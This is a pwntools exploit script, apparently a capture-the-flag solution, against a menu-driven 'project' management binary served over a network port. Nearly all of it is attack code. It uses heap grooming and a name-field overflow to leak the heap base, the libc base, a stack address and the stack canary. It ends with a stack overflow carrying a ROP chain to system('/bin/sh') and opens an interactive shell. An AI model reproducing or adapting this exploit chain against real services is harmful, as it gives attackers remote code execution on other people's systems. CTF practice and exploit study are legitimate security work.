#!/usr/bin/env python
from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('47.74.144.222', 20007)
libc = ELF('libc.so.6')

def start(name_len, name, price, area, capacity):
    r.sendlineafter('5. Exit', '1')
    r.sendlineafter('Input length of your project name: ', str(name_len))
    r.sendafter('Input your project name: ', name)
    r.sendlineafter('Input your project price: ', str(price))
    r.sendlineafter('Input your project area: ', str(area))
    r.sendlineafter('Input your project capacity: ', str(capacity))

def view():
    r.sendlineafter('5. Exit', '2')

def edit():
    r.sendlineafter('5. Exit', '3')

def cancel(proj_idx):
    r.sendlineafter('5. Exit', '4')
    r.sendlineafter('Input your projects number: ', str(proj_idx))

start(96-29, 'AAAA\n', 1, 2, 3) #0
start(80-29, 'BBBB\n', 4, 5, 6) #1
start(80-29, 'CCCC\n', 7, 8, 9) #2
start(23, 'DDDD\n', 10, 11, 12) #3

start(32-29, 'E'+'\n', 13, 14, 15) #4
start(0, 'F'*90+'\n', 16, 17, 18) #5
start(64-29, 'GGGG\n', 19, 20, 21) #6

cancel(6)
cancel(3)

# leak heap base
view()
r.recvuntil('Capacity: 15')
r.recvuntil('Price: ')
mid = (int(r.recvline()[:-1], 10) & 0xffffffff) << 8
r.recvuntil('Area: ')
front = int(r.recvline()[:-1], 10) << 40
heap_base = front + mid + 0x80 - 0x180
log.success('heap base: ' + hex(heap_base))

start(0x40-29, 'aaaa\n', 0x44444444, 0x45454545, 0x46464646) #3

start(45-29, 'HHHH\x01\x01\n', 0, 0, 0) #6
start(0x40-29, 'IIII\n', 22, 23, 24) #7
start(0x40-29, 'JJJJ\n', 25, 26, 27) #8
start(0x40-29, 'KKKK\n', 28, 29, 30) #9
start(0x40-29, 'LLLL\n', 31, 32, 33) #10
start(36-29, 'MMMM\n', 0x101, 1094795585, 0x101) #11
start(0x50-29, 'NNNN\n', 34, 35, 36) #12
start(0x50-29, 'OOOO\n', 37, 38, 39) #13
start(0x30-29, 'PPPP\n', 40, 41, 42) #14
start(36-29, 'QQQQ\n', 0x101, 1094795585, 0x21) #15

#raw_input('#')

cancel(0)
cancel(1)
cancel(2)

start(0, 'R'*90+p64(heap_base+0x1e0)[:6]+'\n', 43, 44, 45) #0
cancel(0)

#raw_input('#')

# to prevent invalid access during following view()
cancel(8)
cancel(9)
cancel(10)
cancel(11)
cancel(12)
cancel(13)
cancel(14)
cancel(15)

# leak libc address
start(0, 'S'*90+p64(heap_base+0x200-4)[:6]+'\n', 46, 47, 48) #0
view()
r.recvuntil('Project: ')
libc_base = u64(r.recvn(6)+'\x00'*2) - 0x3c3b78
log.success('libc base: ' + hex(libc_base))
environ = libc_base + libc.symbols['environ']
pop_rdi_ret = libc_base + 0x21102
binsh = libc_base + next(libc.search('/bin/sh\x00'))
system = libc_base + libc.symbols['system']

# leak stack address
start(0, 'S'*90+p64(environ-4)[:6]+'\n', 49, 50, 51) #1
view()
r.recvuntil('Project: ')
r.recvuntil('Project: ')
stack_addr = u64(r.recvn(6)+'\x00'*2)
log.success('stack address: ' + hex(stack_addr))
canary_addr = stack_addr - 0x100 + 1

# leak canary
start(0, 'T'*90+p64(canary_addr-4)[:6]+'\n', 52, 53, 54) #2
view()
r.recvuntil('Project: ')
r.recvuntil('Project: ')
r.recvuntil('Project: ')
canary = u64('\x00'+r.recvn(7))
log.success('canary: ' + hex(canary))

raw_input('#')

# stack overflow !
start(0, 'U'*104+p64(canary)+'U'*40+p64(pop_rdi_ret)+p64(binsh)+p64(system)+'\n', 55, 56, 57)

r.interactive()
